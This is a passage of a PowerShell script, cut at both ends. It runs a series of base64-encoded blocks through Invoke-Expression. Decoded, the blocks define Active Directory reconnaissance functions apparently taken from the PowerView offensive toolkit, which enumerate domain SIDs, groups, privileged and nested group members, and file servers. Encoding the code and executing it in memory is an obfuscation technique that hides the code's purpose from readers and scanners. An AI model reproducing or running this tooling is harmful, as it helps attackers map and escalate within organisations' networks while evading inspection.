YXRjaCAiQ049JFNpdGVOYW1lIiB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoICgkU2l0ZU5hbWUgLWFuZCAoJF8ucHJvcGVydGllcy5zaXRlb2JqZWN0IC1tYXRjaCAiQ049JFNpdGVOYW1lLCIpKSAtb3IgKCRTaXRlTmFtZSAtZXEgJyonKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFN1Ym5ldFByb3BlcnRpZXMgPSBAewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdTdWJuZXQnID0gJF8ucHJvcGVydGllcy5uYW1lWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTdWJuZXRQcm9wZXJ0aWVzWydTaXRlJ10gPSAoJF8ucHJvcGVydGllcy5zaXRlb2JqZWN0WzBdKS5zcGxpdCgiLCIpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFN1Ym5ldFByb3BlcnRpZXNbJ1NpdGUnXSA9ICdFcnJvcicKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IC1Qcm9wZXJ0eSAkU3VibmV0UHJvcGVydGllcyAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAkXwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblNJRCB7CiAgICBwYXJhbSgKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4KICAgICkKICAgICRGb3VuZERvbWFpbiA9IEdldC1OZXREb21haW4gLURvbWFpbiAkRG9tYWluCiAgICBpZigkRm91bmREb21haW4pIHsKICAgICAgICAkUHJpbWFyeURDID0gJEZvdW5kRG9tYWluLlBkY1JvbGVPd25lcgogICAgICAgICRQcmltYXJ5RENTSUQgPSAoR2V0LU5ldENvbXB1dGVyIC1Eb21haW4gJERvbWFpbiAtQ29tcHV0ZXJOYW1lICRQcmltYXJ5REMgLUZ1bGxEYXRhKS5vYmplY3RzaWQKICAgICAgICAkUGFydHMgPSAkUHJpbWFyeURDU0lELnNwbGl0KCItIikKICAgICAgICAkUGFydHNbMC4uKCRQYXJ0cy5sZW5ndGggLTIpXSAtam9pbiAiLSIKICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldEdyb3VwIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRHcm91cE5hbWUgPSAnKicsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU0lELAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJOYW1lLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEZpbHRlciwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluQ29udHJvbGxlciwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRBRFNwYXRoLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEFkbWluQ291bnQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRnVsbERhdGEsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmF3U2lkcywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLDEwMDAwKV0gCiAgICAgICAgW0ludF0KICAgICAgICAkUGFnZVNpemUgPSAyMDAKICAgICkKICAgIGJlZ2luIHsKICAgICAgICAkR3JvdXBTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUFEU3BhdGggJEFEU3BhdGggLVBhZ2VTaXplICRQYWdlU2l6ZQogICAgfQogICAgcHJvY2VzcyB7CiAgICAgICAgaWYoJEdyb3VwU2VhcmNoZXIpIHsKICAgICAgICAgICAgaWYoJEFkbWluQ291bnQpIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNoZWNraW5nIGZvciBhZG1pbkNvdW50PTEiCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIoYWRtaW5jb3VudD0xKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFVzZXJOYW1lKSB7CiAgICAgICAgICAgICAgICAkVXNlciA9IEdldC1BRE9iamVjdCAtU2FtQWNjb3VudE5hbWUgJFVzZXJOYW1lIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtUmV0dXJuUmF3IC1QYWdlU2l6ZSAkUGFnZVNpemUKICAgICAgICAgICAgICAgICRVc2VyRGlyZWN0b3J5RW50cnkgPSAkVXNlci5HZXREaXJlY3RvcnlFbnRyeSgpCiAgICAgICAgICAgICAgICAkVXNlckRpcmVjdG9yeUVudHJ5LlJlZnJlc2hDYWNoZSgidG9rZW5Hcm91cHMiKQogICAgICAgICAgICAgICAgJFVzZXJEaXJlY3RvcnlFbnRyeS5Ub2tlbkdyb3VwcyB8IEZvcmVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkR3JvdXBTaWQgPSAoTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcigkXywwKSkuVmFsdWUKICAgICAgICAgICAgICAgICAgICBpZighKCRHcm91cFNpZCAtbWF0Y2ggJ15TLTEtNS0zMi01NDV8LTUxMyQnKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZigkRnVsbERhdGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdldC1BRE9iamVjdCAtU0lEICRHcm91cFNpZCAtUGFnZVNpemUgJFBhZ2VTaXplCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkUmF3U2lkcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFNpZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29udmVydC1TaWRUb05hbWUgJEdyb3VwU2lkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoJFNJRCkgewogICAgICAgICAgICAgICAgICAgICRHcm91cFNlYXJjaGVyLmZpbHRlciA9ICIoJihvYmplY3RDYXRlZ29yeT1ncm91cCkob2JqZWN0U0lEPSRTSUQpJEZpbHRlcikiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkR3JvdXBTZWFyY2hlci5maWx0ZXIgPSAiKCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApKG5hbWU9JEdyb3VwTmFtZSkkRmlsdGVyKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRHcm91cFNlYXJjaGVyLkZpbmRBbGwoKSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgIGlmICgkRnVsbERhdGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgQ29udmVydC1MREFQUHJvcGVydHkgLVByb3BlcnRpZXMgJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJF8ucHJvcGVydGllcy5zYW1hY2NvdW50bmFtZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldEdyb3VwTWVtYmVyIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRHcm91cE5hbWUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU0lELAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiA9IChHZXQtTmV0RG9tYWluKS5OYW1lLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQURTcGF0aCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRGdWxsRGF0YSwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSZWN1cnNlLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFVzZU1hdGNoaW5nUnVsZSwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLDEwMDAwKV0gCiAgICAgICAgW0ludF0KICAgICAgICAkUGFnZVNpemUgPSAyMDAKICAgICkKICAgIGJlZ2luIHsKICAgICAgICAkR3JvdXBTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUFEU3BhdGggJEFEU3BhdGggLVBhZ2VTaXplICRQYWdlU2l6ZQogICAgICAgIGlmKCEkRG9tYWluQ29udHJvbGxlcikgewogICAgICAgICAgICAkRG9tYWluQ29udHJvbGxlciA9ICgoR2V0LU5ldERvbWFpbikuUGRjUm9sZU93bmVyKS5OYW1lCiAgICAgICAgfQogICAgfQogICAgcHJvY2VzcyB7CiAgICAgICAgaWYgKCRHcm91cFNlYXJjaGVyKSB7CiAgICAgICAgICAgIGlmICgkUmVjdXJzZSAtYW5kICRVc2VNYXRjaGluZ1J1bGUpIHsKICAgICAgICAgICAgICAgIGlmICgkR3JvdXBOYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwID0gR2V0LU5ldEdyb3VwIC1Hcm91cE5hbWUgJEdyb3VwTmFtZSAtRG9tYWluICREb21haW4gLUZ1bGxEYXRhIC1QYWdlU2l6ZSAkUGFnZVNpemUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJFNJRCkgewogICAgICAgICAgICAgICAgICAgICRHcm91cCA9IEdldC1OZXRHcm91cCAtU0lEICRTSUQgLURvbWFpbiAkRG9tYWluIC1GdWxsRGF0YSAtUGFnZVNpemUgJFBhZ2VTaXplCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkU0lEID0gKEdldC1Eb21haW5TSUQgLURvbWFpbiAkRG9tYWluKSArICItNTEyIgogICAgICAgICAgICAgICAgICAgICRHcm91cCA9IEdldC1OZXRHcm91cCAtU0lEICRTSUQgLURvbWFpbiAkRG9tYWluIC1GdWxsRGF0YSAtUGFnZVNpemUgJFBhZ2VTaXplCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkR3JvdXBETiA9ICRHcm91cC5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgJEdyb3VwRm91bmROYW1lID0gJEdyb3VwLm5hbWUKICAgICAgICAgICAgICAgIGlmICgkR3JvdXBETikgewogICAgICAgICAgICAgICAgICAgICRHcm91cFNlYXJjaGVyLmZpbHRlciA9ICIoJihzYW1BY2NvdW50VHlwZT04MDUzMDYzNjgpKG1lbWJlcm9mOjEuMi44NDAuMTEzNTU2LjEuNC4xOTQxOj0kR3JvdXBETikkRmlsdGVyKSIKICAgICAgICAgICAgICAgICAgICAkR3JvdXBTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZFJhbmdlKCgnZGlzdGluZ3Vpc2hlZE5hbWUnLCdzYW1hY2NvdW50dHlwZScsJ2xhc3Rsb2dvbicsJ2xhc3Rsb2dvbnRpbWVzdGFtcCcsJ2RzY29yZXByb3BhZ2F0aW9uZGF0YScsJ29iamVjdHNpZCcsJ3doZW5jcmVhdGVkJywnYmFkcGFzc3dvcmR0aW1lJywnYWNjb3VudGV4cGlyZXMnLCdpc2NyaXRpY2Fsc3lzdGVtb2JqZWN0JywnbmFtZScsJ3VzbmNoYW5nZWQnLCdvYmplY3RjYXRlZ29yeScsJ2Rlc2NyaXB0aW9uJywnY29kZXBhZ2UnLCdpbnN0YW5jZXR5cGUnLCdjb3VudHJ5Y29kZScsJ2Rpc3Rpbmd1aXNoZWRuYW1lJywnY24nLCdhZG1pbmNvdW50JywnbG9nb25ob3VycycsJ29iamVjdGNsYXNzJywnbG9nb25jb3VudCcsJ3VzbmNyZWF0ZWQnLCd1c2VyYWNjb3VudGNvbnRyb2wnLCdvYmplY3RndWlkJywncHJpbWFyeWdyb3VwaWQnLCdsYXN0bG9nb2ZmJywnc2FtYWNjb3VudG5hbWUnLCdiYWRwd2Rjb3VudCcsJ3doZW5jaGFuZ2VkJywnbWVtYmVyb2YnLCdwd2RsYXN0c2V0JywnYWRzcGF0aCcpKQogICAgICAgICAgICAgICAgICAgICRNZW1iZXJzID0gJEdyb3VwU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwRm91bmROYW1lID0gJEdyb3VwTmFtZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtRXJyb3IgIlVuYWJsZSB0byBmaW5kIEdyb3VwIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgaWYgKCRHcm91cE5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAkR3JvdXBTZWFyY2hlci5maWx0ZXIgPSAiKCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApKG5hbWU9JEdyb3VwTmFtZSkkRmlsdGVyKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJFNJRCkgewogICAgICAgICAgICAgICAgICAgICRHcm91cFNlYXJjaGVyLmZpbHRlciA9ICIoJihvYmplY3RDYXRlZ29yeT1ncm91cCkob2JqZWN0U0lEPSRTSUQpJEZpbHRlcikiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkU0lEID0gKEdldC1Eb21haW5TSUQgLURvbWFpbiAkRG9tYWluKSArICItNTEyIgogICAgICAgICAgICAgICAgICAgICRHcm91cFNlYXJjaGVyLmZpbHRlciA9ICIoJihvYmplY3RDYXRlZ29yeT1ncm91cCkob2JqZWN0U0lEPSRTSUQpJEZpbHRlcikiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkR3JvdXBTZWFyY2hlci5GaW5kQWxsKCkgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEoJF8pIC1vciAhKCRfLnByb3BlcnRpZXMpIC1vciAhKCRfLnByb3BlcnRpZXMubmFtZSkpIHsgY29udGludWUgfQogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBGb3VuZE5hbWUgPSAkXy5wcm9wZXJ0aWVzLm5hbWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcnMgPSBAKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfLnByb3BlcnRpZXMubWVtYmVyLkNvdW50IC1lcSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRmluaXNoZWQgPSAkRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRCb3R0b20gPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVG9wID0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUoISRGaW5pc2hlZCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRUb3AgPSAkQm90dG9tICsgMTQ5OQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJSYW5nZT0ibWVtYmVyO3JhbmdlPSRCb3R0b20tJFRvcCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQm90dG9tICs9IDE1MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkNsZWFyKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbdm9pZF0kR3JvdXBTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZCgiJE1lbWJlclJhbmdlIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUmVzdWx0ID0gJEdyb3VwU2VhcmNoZXIuRmluZE9uZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUmFuZ2VkUHJvcGVydHkgPSAkXy5Qcm9wZXJ0aWVzLlByb3BlcnR5TmFtZXMgLWxpa2UgIm1lbWJlcjtyYW5nZT0qIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJlc3VsdHMgPSAkXy5Qcm9wZXJ0aWVzLml0ZW0oJFJhbmdlZFByb3BlcnR5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRSZXN1bHRzLmNvdW50IC1lcSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZpbmlzaGVkID0gJFRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSZXN1bHRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVycyArPSAkXwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGaW5pc2hlZCA9ICRUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLk1ldGhvZEludm9jYXRpb25FeGNlcHRpb25dIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZpbmlzaGVkID0gJFRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcnMgPSAkXy5wcm9wZXJ0aWVzLm1lbWJlcgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJF8KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJE1lbWJlcnMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkUmVjdXJzZSAtYW5kICRVc2VNYXRjaGluZ1J1bGUpIHsKICAgICAgICAgICAgICAgICAgICAkUHJvcGVydGllcyA9ICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBpZigkRG9tYWluQ29udHJvbGxlcikgewogICAgICAgICAgICAgICAgICAgICAgICAkUmVzdWx0ID0gW2Fkc2ldIkxEQVA6Ly8kRG9tYWluQ29udHJvbGxlci8kXyIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRSZXN1bHQgPSBbYWRzaV0iTERBUDovLyRfIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZigkUmVzdWx0KXsKICAgICAgICAgICAgICAgICAgICAgICAgJFByb3BlcnRpZXMgPSAkUmVzdWx0LlByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZigkUHJvcGVydGllcykgewogICAgICAgICAgICAgICAgICAgIGlmKCRQcm9wZXJ0aWVzLnNhbWFjY291bnR0eXBlIC1ub3RtYXRjaCAnODA1MzA2MzY4JykgewogICAgICAgICAgICAgICAgICAgICAgICAkSXNHcm91cCA9ICRUcnVlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkSXNHcm91cCA9ICRGYWxzZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJEZ1bGxEYXRhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlciA9IENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRQcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXIgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cERvbWFpbicgJERvbWFpbgogICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE5hbWUnICRHcm91cEZvdW5kTmFtZQogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJETiA9ICRQcm9wZXJ0aWVzLmRpc3Rpbmd1aXNoZWRuYW1lWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJEb21haW4gPSAkTWVtYmVyRE4uc3ViU3RyaW5nKCRNZW1iZXJETi5JbmRleE9mKCJEQz0iKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJETiA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJEb21haW4gPSAkTnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFByb3BlcnRpZXMuc2FtYWNjb3VudG5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlck5hbWUgPSAkUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZVswXQogICAgICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyTmFtZSA9IENvbnZlcnQtU2lkVG9OYW1lICRQcm9wZXJ0aWVzLmNuWzBdCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlck5hbWUgPSAkUHJvcGVydGllcy5jbgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmKCRQcm9wZXJ0aWVzLm9iamVjdFNpZCkgewogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyU2lkID0gKChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyICRQcm9wZXJ0aWVzLm9iamVjdFNpZFswXSwwKS5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJTaWQgPSAkTnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWVtYmVyRG9tYWluJyAkTWVtYmVyRG9tYWluCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01lbWJlck5hbWUnICRNZW1iZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01lbWJlclNpZCcgJE1lbWJlclNpZAogICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJc0dyb3VwJyAkSXNHcm91cAogICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJETicgJE1lbWJlckROCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyCiAgICAgICAgICAgICAgICAgICAgaWYgKCRSZWN1cnNlIC1hbmQgISRVc2VNYXRjaGluZ1J1bGUgLWFuZCAkSXNHcm91cCAtYW5kICRNZW1iZXJOYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIEdldC1OZXRHcm91cE1lbWJlciAtRnVsbERhdGEgLURvbWFpbiAkTWVtYmVyRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1Hcm91cE5hbWUgJE1lbWJlck5hbWUgLVJlY3Vyc2UgLVBhZ2VTaXplICRQYWdlU2l6ZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldEZpbGVTZXJ2ZXIgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW5Db250cm9sbGVyLAogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkVGFyZ2V0VXNlcnMsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDAwMCldIAogICAgICAgIFtJbnRdCiAgICAgICAgJFBhZ2VTaXplID0gMjAwCiAgICApCiAgICBmdW5jdGlvbiBTcGxpdFBhdGggewogICAgICAgIHBhcmFtKFtTdHJpbmddJFBhdGgpCiAgICAgICAgaWYgKCRQYXRoIC1hbmQgKCRQYXRoLnNwbGl0KCJcXCIpLkNvdW50IC1nZSAzKSkgewogICAgICAgICAgICAkVGVtcCA9ICRQYXRoLnNwbGl0KCJcXCIpWzJdCiAgICAgICAgICAgIGlmKCRUZW1wIC1hbmQgKCRUZW1wIC1uZSAnJykpIHsKICAgICAgICAgICAgICAgICRUZW1wCiAgICAgICAgICAgIH0KI